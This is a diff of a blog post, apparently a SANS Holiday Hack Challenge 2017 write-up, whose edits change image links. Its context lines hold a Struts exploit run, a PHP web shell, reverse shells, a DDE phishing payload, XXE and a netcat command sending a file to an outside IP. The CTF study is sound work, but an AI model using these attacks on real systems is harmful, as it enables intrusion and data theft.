@@ -98,7 +98,7 @@ For us to be able to unlock hints and some of the __Great Book__ pages, we will 
 
 When accessing __North Pole and Beyond__ we can see there are 8 levels total.
 
-<a href="/images/shh1.png"><img src="/images/shh1.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh1.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh1.png"></a>
 
 I suggest beating all the terminal levels and finish the levels before answering the questions since this will provide us with specific hints on what we should do.
 
@@ -237,13 +237,13 @@ Background daemon...
 Once we complete the CranberyPI Terminal challenge, we are able to unlock the "__Convery Belt__" tool, which can be used to re-direct the snowball across the Great Book Page.
 
 
-<a href="/images/shh2.png"><img src="/images/shh2.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh2.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh2.png"></a>
 
 Once you obtain the Great Book Page in the __Winter Wonder Landing__ level, you will be able to see it in your __Stocking__.
 
-<a href="/images/shh3.png"><img src="/images/shh3.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh3.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh3.png"></a>
 
-<a href="/images/shh4.png"><img src="/images/shh4.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh4.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh4.png"></a>
 
 #### Answer #1:
 
@@ -286,7 +286,7 @@ elf@f0e40bc3622f:~$
 
 So from the get-go it seems Sparkle is having an issue killing the __santaslittlehelperd__ process. If we take a look at [Sparkle's Twitter](https://twitter.com/GlitteryElf) we are presented with her issue, and a few hints on what we can use to kill the process.
 
-<a href="/images/shh5.png"><img src="/images/shh5.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh5.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh5.png"></a>
 
 Alright, with those hints in the back of our mind, let's run `ps -ef` to see what processes are running and what [PID](http://www.linfo.org/pid.html) is associated to each one of them.
 
@@ -364,9 +364,9 @@ elf        115    12  0 01:25 pts/0    00:00:00 ps -ef
 
 Perfect! The process has been successfully killed! Upon completing the Terminal Challenge and directing the Snowball to the exit, we are presented with a new tool, and some hints from Sparkle
 
-<a href="/images/shh6.png"><img src="/images/shh6.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh6.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh6.png"></a>
 
-<a href="/images/shh7.png"><img src="/images/shh7.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh7.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh7.png"></a>
 
 ### North Pole Christmas Town Infrastructure
 
@@ -374,19 +374,19 @@ Perfect! The process has been successfully killed! Upon completing the Terminal 
 
 Upon accessing the [Letters to Santa](https://l2s.northpolechristmastown.com/) Application, we are presented with the following screen.
 
-<a href="/images/shh8.png"><img src="/images/shh8.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh8.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh8.png"></a>
 
 Taking a look at the source code of the page, we spot a rather interesting comment about a "Development Version", along with a link to that site.
 
-<a href="/images/shh9.png"><img src="/images/shh9.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh9.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh9.png"></a>
 
 Navigating to the website, we are automatically redirected to the __order.xhtml__ page, and can see that it's a Toy Request Form.
 
-<a href="/images/shh10.png"><img src="/images/shh10.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh10.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh10.png"></a>
 
 Inspecting the source code for that page, also reveals some very important information... the page is running the Apache Struts Framework!
 
-<a href="/images/shh11.png"><img src="/images/shh11.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh11.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh11.png"></a>
 
 At this point I remembered that SANS wrote a great post on "[Why You Need the Skills to Tinker with Publicly Released Exploit Code](https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code)" which included the modification of the The Apache Struts 2 REST Plugin XStream RCE ([CVE-2017-9805](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/struts2_rest_xstream.rb)) Exploit Code.
 
@@ -394,7 +394,7 @@ Toward the end of the article Chris Davis provides us a link to his recoded expl
 
 After copying over the exploit to my Kali Machine, I ran it via python to see the usage and arguments needed.
 
-<a href="/images/shh12.png"><img src="/images/shh12.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh12.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh12.png"></a>
 
 Interestingly enough, in the URL parameter we see that the example points to a server with an ending of "__orders.xhtml__"! Which is the same page we were redirected to when navigating to the dev page "https://dev.northpolechristmastown.com". 
 
@@ -412,7 +412,7 @@ root@kali:~# python cve-2017-9805.py -u https://dev.northpolechristmastown.com/o
 
 We see that the exploit executed without any issues. So from here, let's navigate to http://l2s.northpolechristmastown.com/test.txt and see if we indeed were able to exploit Apache Struts.
 
-<a href="/images/shh13.png"><img src="/images/shh13.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh13.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh13.png"></a>
 
 Nice, we are able to execute commands on the server! At this point I wanted to get a PHP Shell onto the server, so I opted to use this following simple one line PHP Script found on GitHub - https://gist.github.com/sente/4dbb2b7bdda2647ba80b.
 
@@ -430,13 +430,13 @@ root@kali:~# python cve-2017-9805.py -u https://dev.northpolechristmastown.com/o
 
 Okay, so the command executed successfully. Let's test the PHP shell by trying to execute the `ls -la` command to list all the files in the current working directory.
 
-<a href="/images/shh14.png"><img src="/images/shh14.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh14.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh14.png"></a>
 
 Perfect! So we can execute commands via the PHP shell. At this point, we see that the second page of the Great Book is located in the web directory. 
 
 Simply navigating to http://l2s.northpolechristmastown.com/GreatBookPage2.pdf will allow us to see and download Page 2.
 
-<a href="/images/shh17.png"><img src="/images/shh17.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh17.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh17.png"></a>
 
 Now that we got the 2nd page of the Great Book, we have to find Alabaster Snowballs password.
 
@@ -446,7 +446,7 @@ The post goes through the process of setting up a Free Amazon EC2 Instance in AW
 
 After reading the post I opted to create an EC2 instance and utilized my PHP Shell to create a Reverse Shell back to my EC2 instance.
 
-<a href="/images/shh15.png"><img src="/images/shh15.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh15.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh15.png"></a>
 
 After running the command, we get a successful reverse shell back to our EC2 instance.
 
@@ -460,7 +460,7 @@ whoami
 www-data
 ```
 
-<a href="/images/shh16.png"><img src="/images/shh16.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh16.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh16.png"></a>
 
 Now that we have shell access to the server, let's spawn up an Interactive [TTY Shell](https://netsec.ws/?p=337) by using Python.
 
@@ -584,7 +584,7 @@ Yah I was right, it's not going to be so easy.
 
 Looking at Holly's Twitter, we see a tweet about how chmod was removed from her system, which would explain why we weren't able to assign the executable bit to the binary.
 
-<a href="/images/shh18.png"><img src="/images/shh18.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh18.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh18.png"></a>
 
 At the end of the tweet we see a link on how to [execute a Linux binary without the execute permission bit being set](https://superuser.com/questions/341439/can-i-execute-a-linux-binary-without-the-execute-permission-bit-being-set).
 
@@ -624,9 +624,9 @@ The candy cane striping machine is up and running!
 
 Awesome, we were able to successfully execute our binary file, and competed the terminal challenge! After that, go ahead and redirect the snowball to the exit to unlock extra hints for future challenges.
 
-<a href="/images/shh19.png"><img src="/images/shh19.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh19.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh19.png"></a>
 
-<a href="/images/shh20.png"><img src="/images/shh20.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh20.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh20.png"></a>
 
 ### North Pole Christmas Town Infrastructure
 
@@ -636,7 +636,7 @@ For this challenge, we need to identify and enumerate a SMB file-sharing server 
 
 Holly actually provides us a very good hint on detecting certain ports via Nmap, which we can utilize for identifying our SMB-Server.
 
-<a href="/images/shh21.png"><img src="/images/shh21.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh21.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh21.png"></a>
 
 First of all, we need to find out the Internal IP range for the Christmas Town Infrastructure. 
 
@@ -769,7 +769,7 @@ To do so, we will have to do some port forwarding via SSH - this will allow us t
 
 Holly actually provides us a good hint on [SSH Port Forwarding](https://help.ubuntu.com/community/SSH/OpenSSH/PortForwarding).
 
-<a href="/images/shh22.png"><img src="/images/shh22.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh22.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh22.png"></a>
 
 Alright, so let's go ahead and forward TCP/445 to the SMB Server via the following command.
 
@@ -839,7 +839,7 @@ smb: \>
 
 Awesome, we found the 3rd Page of the Great Book! We can simply run the `get` command via SMB to download the file to our Kali machine.
 
-<a href="/images/shh23.png"><img src="/images/shh23.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh23.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh23.png"></a>
 
 I also see that there are more files on the file share, so let's go ahead and download them all, just in case we might need them later.
 
@@ -951,9 +951,9 @@ You did it! Thank you!
 
 Once you complete the challenge you will unlock a new tool that will help you navigate the snowball toward the end of the level. Once you get the snowball to the end, you will unlock more hints for future challenges.
 
-<a href="/images/shh24.png"><img src="/images/shh24.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh24.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh24.png"></a>
 
-<a href="/images/shh25.png"><img src="/images/shh25.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh25.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh25.png"></a>
 
 ### North Pole Christmas Town Infrastructure
 
@@ -991,19 +991,19 @@ alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.anntDS9kgZfLYSCN2iFa2GML$
 
 And then let's configure the proxy...
 
-<a href="/images/shh26.png"><img src="/images/shh26.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh26.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh26.png"></a>
 
 Once that's done, we can navigate to __10.142.0.5__ in our browser and we will be presented with the following login page for the EWA Server.
 
-<a href="/images/shh27.png"><img src="/images/shh27.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh27.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh27.png"></a>
 
 If we actually take a look at the hints provided by Pepper Minstix, we learn that Alabaster created his own Encryption Scheme for the Session Cookies, and also get a hint about editing cookies as well. 
 
-<a href="/images/shh28.png"><img src="/images/shh28.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh28.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh28.png"></a>
 
 First of all, let's use [Cookie Manager +](https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/) in FireFox to view out EWA cookie.
 
-<a href="/images/shh29.png"><img src="/images/shh29.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh29.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh29.png"></a>
 
 After reading those hints and seeing the cookie, we come to understand that our ultimate goal is to get the plaintext to equal the ciphertext.
 
@@ -1021,33 +1021,33 @@ The base64 encoding of the null bytes gives us the string of As with the padding
 
 So to accomplish this, we simply add Alabaster's Email as his name, leave the plaintext blank, and include 21 "A"'s as the Ciphertext.
 
-<a href="/images/shh30.png"><img src="/images/shh30.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh30.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh30.png"></a>
 
 This should initialy give us a valid cookie and allow us to bypass the login and access's alabster's email. So let's submit the cookie, and refresh the page.
 
-<a href="/images/shh31.png"><img src="/images/shh31.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh31.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh31.png"></a>
 
 Awesome, it worked! We got access to Alabasters Email Account!
 
 Digging through the email we come across a few emails that might help us in the future - including one about a Ginger Bread Recepie, and one about a DDE Attack Vector.
 
-<a href="/images/shh32.png"><img src="/images/shh32.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh32.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh32.png"></a>
 
-<a href="/images/shh33.png"><img src="/images/shh33.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh33.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh33.png"></a>
 
-<a href="/images/shh34.png"><img src="/images/shh34.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh34.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh34.png"></a>
 
 At the same time, we learn that Alabaster lovers powershell, but also has netcat installed... hmmm.
 
-<a href="/images/shh35.png"><img src="/images/shh35.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh35.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh35.png"></a>
 
 Toward the end of the page, we see an email with a link to the 4th page of the Great Book.
 
-<a href="/images/shh36.png"><img src="/images/shh36.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh36.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh36.png"></a>
 
 Accessing that link allows us to read the 4th Page.
 
-<a href="/images/shh37.png"><img src="/images/shh37.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh37.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh37.png"></a>
 
 ## The Great Book: Page 5
 
@@ -1165,15 +1165,15 @@ That is the least common browser in the web log! Congratulations!
 
 Once that's completed, you will receive a new tool that will help you navigate your snowball to the end of the level.
 
-<a href="/images/shh38.png"><img src="/images/shh38.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh38.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh38.png"></a>
 
-<a href="/images/shh39.png"><img src="/images/shh39.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh39.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh39.png"></a>
 
 At the same time, the new tools will help you get the 5th page of the Great Book which can be found in the level.
 
-<a href="/images/shh40.png"><img src="/images/shh40.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh40.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh40.png"></a>
 
-<a href="/images/shh41.png"><img src="/images/shh41.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh41.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh41.png"></a>
 
 ### North Pole Christmas Town Infrastructure
 
@@ -1181,21 +1181,21 @@ At the same time, the new tools will help you get the 5th page of the Great Book
 
 Upon accessing https://nppd.northpolechristmastown.com/ we are presented with the following website. 
 
-<a href="/images/shh42.png"><img src="/images/shh42.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh42.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh42.png"></a>
 
 From the looks of it, we can see Reports of Elf's who committed crimes along with their name and crime committed.
 
 At the same time, it seems that we can search through the reports either by keywords or date. So to help us answer our questions, I opted to search for everything in the database before the date of __2017-12-30__.
 
-<a href="/images/shh43.png"><img src="/images/shh43.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh43.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh43.png"></a>
 
 Once we get the results, upon scrolling down we see that we can download a JSON file containing all the results.
 
-<a href="/images/shh44.png"><img src="/images/shh44.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh44.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh44.png"></a>
 
 Upon downloading the file, we can see that we have a query of all the results from the NPPD Database.
 
-<a href="/images/shh45.png"><img src="/images/shh45.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh45.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh45.png"></a>
 
 Now, if you remember back to when we downloaded the files from the SMB Server, we had a file called "__BOLO: Munchkin Mole Advisory__"
 
@@ -1237,7 +1237,7 @@ Alabaster Snowball,Nice
 
 Looking at the reports we see the Moles did 3 crimes, Throwing Rocks and Hair Pulling. At the same time we see that there are two types of throwing rocks - at people, and at non-person targets.
 
-<a href="/images/shh46.png"><img src="/images/shh46.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh46.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh46.png"></a>
 
 To be able to answer our question and find the 6 moles, I created a python script.
 
@@ -1433,9 +1433,9 @@ That is the #1 Christmas song, congratulations!
 
 Awesome, we are right! Once you complete this terminal challenge, you will unlock a new tool that will help you in redirecting the snowball in the levels. After you redirect the snowball for this level, you will unlock more hints for the next challenges.
 
-<a href="/images/shh47.png"><img src="/images/shh47.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh47.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh47.png"></a>
 
-<a href="/images/shh48.png"><img src="/images/shh48.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh48.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh48.png"></a>
 
 ### North Pole Christmas Town Infrastructure
 
@@ -1467,15 +1467,15 @@ alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.FCginkV6JiLIj2o9JJ8u8tsN$
 
 Once that’s been completed, we can navigate to __localhost:8050__ and we will be able to see the main page for the EAAS System.
 
-<a href="/images/shh49.png"><img src="/images/shh49.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh49.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh49.png"></a>
 
 Upon inspecting the page, we notice that we are able to check current orders via the __EC2__ link.
 
-<a href="/images/shh50.png"><img src="/images/shh50.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh50.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh50.png"></a>
 
 Upon accessing that page we are redirected to the __DisplayXML__ page, and it seems that we are able to upload a file… and judging by the title of it, we can probably upload an XML file.
 
-<a href="/images/shh51.png"><img src="/images/shh51.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh51.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh51.png"></a>
 
 I know that SANS wrote a very good post about [Exploiting XXE Vulnerabilities in IIS/.NET](https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities).
 
@@ -1524,15 +1524,15 @@ Listening on [0.0.0.0] (family 0, port 4444)
 
 After that’s all said and done, we can upload the XML file.
 
-<a href="/images/shh52.png"><img src="/images/shh52.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh52.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh52.png"></a>
 
 I also capture the request via Burp just to make sure there were no errors when uploading.
 
-<a href="/images/shh53.png"><img src="/images/shh53.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh53.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh53.png"></a>
 
 You know that the file uploaded successfully when you are presented with and empty page such as the one below.
 
-<a href="/images/shh54.png"><img src="/images/shh54.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh54.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh54.png"></a>
 
 If you also look at your SimpleHTTPServer, you will see a successful GET request was made for you DTD file.
 
@@ -1555,7 +1555,7 @@ Connection: Keep-Alive
 
 From here, all we need to do is navigate to http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf and we will be able to see the 6th page of the Great Book.
 
-<a href="/images/shh55.png"><img src="/images/shh55.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh55.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh55.png"></a>
 
 ## The Great Book: Page 7
 
@@ -1630,9 +1630,9 @@ elf@24f154ad424a:~$ inspect_da_box
 
 Once that's completed and after you get the snowball to the end, you will unlock more hints that will help you in the next challenge.
 
-<a href="/images/shh56.png"><img src="/images/shh56.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh56.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh56.png"></a>
 
-<a href="/images/shh57.png"><img src="/images/shh57.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh57.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh57.png"></a>
 
 ### North Pole Christmas Town Infrastructure
 
@@ -1644,13 +1644,13 @@ We are tasked with gaining access to the EMI server through the use of a phishin
 
 If you remember correctly, in our previous challenge, once we gained access to the EWA Server, we spotted an email concerned about the recent DDE Attacks.
 
-<a href="/images/shh33.png"><img src="/images/shh33.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh33.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh33.png"></a>
 
-<a href="/images/shh34.png"><img src="/images/shh34.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh34.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh34.png"></a>
 
 At the same time, we previously found emails from Alabaster to Mrs. Claus asking for her Cookies Recipe.
 
-<a href="/images/shh32.png"><img src="/images/shh32.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh32.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh32.png"></a>
 
 Taking that into account, we can go ahead and attempt a DDE Attack against Alabaster to gain a reverse shell on his system.
 
@@ -1658,7 +1658,7 @@ There is a very good post on creating DDE Macros, which can be found here: https
 
 Once we read the post, we can create a new DDE that will execute a Netcat connection back to our AWS Instance on TCP/4444.
 
-<a href="/images/shh58.png"><img src="/images/shh58.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh58.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh58.png"></a>
 
 Once that's completed, we can save the file as "__GingerBread Recpipe__" or something along those lines.
 
@@ -1671,23 +1671,23 @@ Listening on [0.0.0.0] (family 0, port 4444)
 
 Afterwards, we can return back to the EWA Server and utilize our newly found cookie exploit to access the "__Jessica Claus__" account, which will be used in our phishing attack against Alabaster.
 
-<a href="/images/shh59.png"><img src="/images/shh59.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh59.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh59.png"></a>
 
 Once done, we should have access to Mrs. Claus's email account.
 
-<a href="/images/shh60.png"><img src="/images/shh60.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh60.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh60.png"></a>
 
 From there, let's go ahead and create a new email with the subject "__Gingerbread Cookie Recipe__", attach our Word Document that contains the DDE Attack, and send it off to Alabaster.
 
-<a href="/images/shh61.png"><img src="/images/shh61.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh61.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh61.png"></a>
 
 Once the email is sent, a few moments later we can see that we get a successful Reverse CMD Shell.
 
-<a href="/images/shh62.png"><img src="/images/shh62.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh62.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh62.png"></a>
 
 At this point, we can navigate to the __C:\__ directory and we will spot Page 7 of the Great Book.
 
-<a href="/images/shh63.png"><img src="/images/shh63.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh63.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh63.png"></a>
 
 From here, we can simply use netcat to download the file to our AWS EC2 Instance.
 
@@ -1701,7 +1701,7 @@ C:\>nc -w 3 18.218.75.54 1234 < GreatBookPage7.pdf
 
 Once completed, we can read Page 7 of the Great Book.
 
-<a href="/images/shh64.png"><img src="/images/shh64.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh64.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh64.png"></a>
 
 ## Who's Behind This?
 
@@ -1816,13 +1816,13 @@ Hacked!
 Congratulations! You've won, and have successfully completed this challenge.
 ```
 
-<a href="/images/shh65.png"><img src="/images/shh65.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh65.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh65.png"></a>
 
 ### North Pole Christmas Town Infrastructure
 
 #### Elf Database (EDB):
 
-For this challenge we have to fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com.
+For this challenge we have to fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com.
 
 So as previously, we have to figure out where the EDB Server is located. Taking a look at our previous Nmap scan that we ran shows that the server is located at __10.142.0.6__.
 
@@ -1854,27 +1854,27 @@ alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.LShdupYgziOuBj2fnInGRJXt$
 
 And as previously, let's also make sure that our web proxy is set to listen on TCP/8050.
 
-<a href="/images/shh66.png"><img src="/images/shh66.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh66.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh66.png"></a>
 
 At this time, we can navigate to __10.142.0.6__ and we will be presented with the following Login Page for the EDB.
 
-<a href="/images/shh67.png"><img src="/images/shh67.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh67.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh67.png"></a>
 
 A quikc look into the __robots.txt__ file shows us that there is a __/dev__ directory.
 
-<a href="/images/shh68.png"><img src="/images/shh68.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh68.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh68.png"></a>
 
 Navigating to __/dev/__ reveales a link to a LDIF Template page.
 
-<a href="/images/shh69.png"><img src="/images/shh69.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh69.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh69.png"></a>
 
 Inside that text file we are presented with what looks to be an LDAP Template for the EDB Server. This could be helpful for us in the future or for the login page as LDAP is open and running on TCP/389.
 
-<a href="/images/shh70.png"><img src="/images/shh70.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh70.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh70.png"></a>
 
 If you actually took the time to read some of the hints provided to us by Wunorse, then you would see some specific information about a [XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)) Attack that Wunorse got via some weird email, and that JWT Tokens are being used.
 
-<a href="/images/shh71.png"><img src="/images/shh71.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh71.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh71.png"></a>
 
 I'm going to assume that since we are on the EDB Server - we will be able to execte some sort of XSS Attack via the Support Function on the page.
 
@@ -1882,23 +1882,23 @@ But before we do that, let's dig into the source code of the page to see if we c
 
 If we look at the source code toward the bottom of the index page, we spot a rather unusual token called __np-auth__ that seems to be used for authentication. Intrestingly enough, it also seems to be a token that is in the [localStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage) property of the webpage. 
 
-<a href="/images/shh72.png"><img src="/images/shh72.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh72.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh72.png"></a>
 
 If we are able to execute XSS on the page, then we should be able to gain access to that token and hopefully use it to log in!
 
 Another thing that really caught my attention was the __custom.js__ file. If we take a look at the source code for that JavaScript file, then we see some intresting information about the Customer Service Request page.
 
-<a href="/images/shh73.png"><img src="/images/shh73.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh73.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh73.png"></a>
 
